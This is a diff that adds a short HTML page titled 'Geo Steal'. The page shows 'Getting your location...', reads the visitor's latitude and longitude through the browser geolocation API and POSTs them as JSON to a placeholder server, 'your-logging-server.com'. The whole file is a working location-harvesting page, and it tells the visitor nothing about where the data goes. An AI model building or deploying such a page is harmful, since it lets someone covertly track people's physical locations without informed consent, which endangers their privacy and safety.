@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Geo Steal</title>
+</head>
+<body>
+  <h1>Getting your location...</h1>
+  <script>
+    navigator.geolocation.getCurrentPosition(
+      pos => {
+        const { latitude, longitude } = pos.coords;
+        console.log("Latitude:", latitude, "Longitude:", longitude);
+
+        // OPTIONAL: Send it somewhere
+        fetch("https://your-logging-server.com/log", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ lat: latitude, lon: longitude })
+        }).catch(console.warn);
+      },
+      err => {
+        console.warn("Geo error:", err);
+      }
+    );
+  </script>
+</body>
+</html>
